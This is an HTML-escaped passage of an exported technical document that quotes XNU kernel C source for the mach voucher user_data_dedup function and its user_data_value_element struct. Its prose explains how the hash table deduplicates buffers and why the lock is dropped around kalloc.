 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;i &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* ... we found a match... */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;++;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;();&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;NULL &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;alloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;NULL &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;alloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;();&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;user_data_element_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_sum &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;sum&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_hash &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;hash&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_data&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;goto&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;retry&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queue_enter&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;user_data_bucket&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;alloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;user_data_element_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;e_hash_link&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;();&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;alloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;attributes are just uniquified buffer pointers. Each buffer is represented by a &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;structure, which has a meta-data header followed by a variable-sized inline buffer containing the arbitrary byte data:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.3f4fc041af984f11d98fc5aca7a145c07ded181d&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.29&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;user_data_value_element &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_reference_t &amp;nbsp; &amp;nbsp; e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_sum&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_hash&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queue_chain_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; e_hash_link&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint8_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; e_data&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Pointers to those elements are stored in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_bucket&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;hash table.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;searches the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_bucket&lt;/span&gt;&lt;span&gt;&amp;nbsp;hash table to see if a matching &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;already exists. If not, it allocates one and adds it to the hash table. Note that it&amp;#39;s not allowed to hold locks while calling &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;kalloc()&lt;/span&gt;&lt;span&gt;&amp;nbsp;so the code first has to drop the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock, allocate a &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;then take the lock again and check the hash table a second time to ensure that another thread didn&amp;#39;t also allocate and insert a matching &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;while the lock was dropped.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
